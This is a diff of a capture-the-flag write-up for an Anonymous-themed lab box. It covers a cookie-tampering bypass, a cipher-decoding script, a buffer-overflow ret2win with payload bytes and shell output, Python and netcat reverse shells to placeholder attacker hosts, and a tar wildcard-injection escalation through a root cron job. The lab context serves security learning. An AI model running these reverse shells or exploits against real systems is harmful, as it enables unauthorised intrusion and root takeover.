@@ -3,6 +3,133 @@ Want to become part of Anonymous? They have a challenge for you. Can you get the
 
 Task 1: Prove Yourself
 
-I started by scanning for open ports using nmap -sC -sV <TARGET_IP> and discovered two open ports: 22 (SSH) and 80 (HTTP). The scan also revealed a hidden directory named /zYdHuAKjP/
-<img width="762" height="323" alt="Image" src="https://github.com/user-attachments/assets/7358ccfb-78a0-41fe-8bda-bed118ffac01" />
+Reconnaissance
+I performed an initial port scan to identify active services:
+nmap -sC -sV <TARGET_IP>
+Results:
 
+Port 22: SSH
+
+Port 80: HTTP (Web Server)
+
+Found Directory: /zYdHuAKjP/
+
+## Enumeration
+
+### Web Exploration (Port 80)
+Before diving into the hidden directory, I explored the main web server. I found a file named `operatives.php` which contained a list of names.
+
+### Hidden Directory: /zYdHuAKjP/
+Upon visiting the `/zYdHuAKjP/` directory, I was greeted with an **Access Denied** message. 
+
+To bypass this, I used **Burp Suite** to inspect the traffic:
+1. I found a cookie: `Cookie: access=denied`.
+2. I modified the cookie value to `access=granted`.
+3. After refreshing the page, I was granted access and presented with an encoded string.
+
+**Encoded String:** `hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN`
+
+**Hint Provided:**
+> "I'm going to want to write a Python script for this. 'zA' = 'a'."
+
+def decrypt(cipher_text):
+    alphabet = 'abcdefghijklmnopqrstuvwxyz'
+    # Dictionary mapping for quick lookup
+    val = {char: i + 1 for i, char in enumerate(alphabet)}
+    rev_val = {i + 1: char for i, char in enumerate(alphabet)}
+    
+    decoded = ""
+    # Process the string in steps of 2
+    i = 0
+    while i < len(cipher_text):
+        pair = cipher_text[i:i+2].lower()
+        
+        # Handle the separator "::"
+        if ":" in pair:
+            decoded += ":"
+            i += 1 # Move by 1 to handle individual colons
+            continue
+            
+        # Your core logic: (char1 + char2) mod 26
+        num1 = val[pair[0]]
+        num2 = val[pair[1]]
+        
+        total = (num1 + num2 - 1) % 26 + 1
+        decoded += rev_val[total]
+        i += 2 # Move to the next pair
+        
+    return decoded
+
+# The string found in the /zYdHuAKjP/ directory
+cipher = "hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN"
+print(f"Decoded Credentials: {decrypt(cipher)}")
+
+##Code explanation:
+The decryption process involved a custom substitution cipher where each pair of characters represents a single plaintext letter.
+By mapping 'a-z' to values '1-26' and calculating $(char1 + char2) \pmod{26}$, I was able to automate the extraction of the credentials,
+revealing the user 'magna' and his corresponding password
+
+**Decoded Credentials:**
+`username:password` (Replace this with whatever the script outputs!)
+
+Once you have the decoded credentials, use them to log in via SSH:
+ssh username@TARGET_IP
+
+Privilege Escalation: Binary Exploitation
+Finding the Vulnerability
+After reading Spooky's note, I analyzed the binary hacktheworld. I discovered that the program was vulnerable to a Buffer Overflow. 
+By fuzzing the input, I determined that the application crashes (Segmentation Fault) exactly after 72 bytes of data.
+
+Finding the "Win" Function
+Using readelf, I searched for any interesting functions that might give me an advantage. I found a function named call_bash located at memory address 0x400657
+
+readelf -s hacktheworld | grep -i "call_bash"
+
+magna@ip-10-49-180-41:~$ python -c 'print "A"*71' | ./hacktheworld
+Who do you want to hack? magna@ip-10-49-180-41:~$ 
+magna@ip-10-49-180-41:~$ python -c 'print "A"*72' | ./hacktheworld
+Segmentation fault (core dumped)
+magna@ip-10-49-180-41:~$ readelf -s hacktheworld | grep -i "call_bash"
+    50: 0000000000400657   129 FUNC    GLOBAL DEFAULT   13 call_bash
+magna@ip-10-49-180-41:~$ python -c 'print "A"*72 + "\x58\x06\x40\x00\x00\x00\x00\x00"' | ./hacktheworld
+Who do you want to hack? 
+We are Anonymous.
+We are Legion.
+We do not forgive.
+We do not forget.
+[Message corrupted]...Well...done.
+Segmentation fault (core dumped)
+magna@ip-10-49-180-41:~$ ( python -c 'print "A"*72 + "\x58\x06\x40\x00\x00\x00\x00\x00"'; cat ) | ./hacktheworld
+Who do you want to hack? 
+We are Anonymous.
+We are Legion.
+We do not forgive.
+We do not forget.
+[Message corrupted]...Well...done.
+whoami
+spooky
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+note that I wrapped the exploit in a subshell command: (python -c '...'; cat) | ./hacktheworld. This is necessary because once the Python payload is delivered, the pipe would normally close.
+By adding cat, I keep the stdin open, allowing me to interact with the shell after successfully redirecting execution to call_bash
+
+After gaining access as spooky, I checked the system-wide crontab:
+cat /etc/crontab
+
+I discovered a root cron job running every minute: */1 * * * * root cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
+
+The use of the wildcard (*) in the /home/spooky directory is vulnerable to Wildcard Injection. Since tar is executed by root, I can create files with specific names that tar will interpret as command-line arguments.
+
+Exploitation via Tar Checkpoints
+I used the following steps to inject a malicious command into the tar process:
+
+Create a Reverse Shell Script:
+
+Bash
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 9001 >/tmp/f" > shell.sh
+Create the Injection Files: These files trick tar into executing my script when the wildcard expands:
+
+Bash
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+Catch the Shell: I set up a Netcat listener on my local machine. Within one minute, the cron job executed, triggered the checkpoint action, and granted me a root shell.
